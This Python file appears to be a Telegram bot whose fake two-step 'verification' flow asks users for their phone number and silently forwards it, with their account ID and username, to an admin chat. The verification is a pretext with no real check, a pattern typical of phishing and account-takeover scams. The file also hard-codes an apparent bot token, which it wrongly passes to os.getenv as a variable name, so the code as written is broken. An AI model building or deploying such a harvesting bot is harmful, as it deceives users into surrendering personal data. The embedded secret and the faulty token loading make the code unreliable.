import logging
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, filters, ContextTypes, CallbackQueryHandler
import os

# Load bot token
TOKEN = os.getenv("8144184163:AAFoXga0moJqidy-uWLSKsdY890xub1oNEA")
ADMIN_ID = 123456789  # replace with your Telegram user ID

# Logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# ✅ Start command
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [[InlineKeyboardButton("✅ Verify", callback_data="verify")]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text("Welcome! Please verify to continue:", reply_markup=reply_markup)

# ✅ Verification callback
async def button(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()

    if query.data == "verify":
        # Step 1 done
        await query.edit_message_text("Step 1 verification done ✅\n\nPlease send your phone number to continue.")
        context.user_data["verified"] = True

# ✅ Handle user phone number
async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.message.from_user
    text = update.message.text

    if context.user_data.get("verified"):
        # Send to admin
        msg = (
            "📩 New user reply:\n\n"
            f"🆔 Account ID: {user.id}\n"
            f"👤 Username: @{user.username or 'N/A'}\n"
            f"📞 Number: `{text}`"
        )
        await context.bot.send_message(chat_id=ADMIN_ID, text=msg, parse_mode="Markdown")
        await update.message.reply_text("✅ Verification complete! Use the menu below:")
    else:
        await update.message.reply_text("Please click Verify first using /start")

# ✅ Main entry point
def main():
    app = ApplicationBuilder().token(TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(button))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    print("✅ Bot is running on Replit...")
    app.run_polling()

if __name__ == "__main__":
    main()



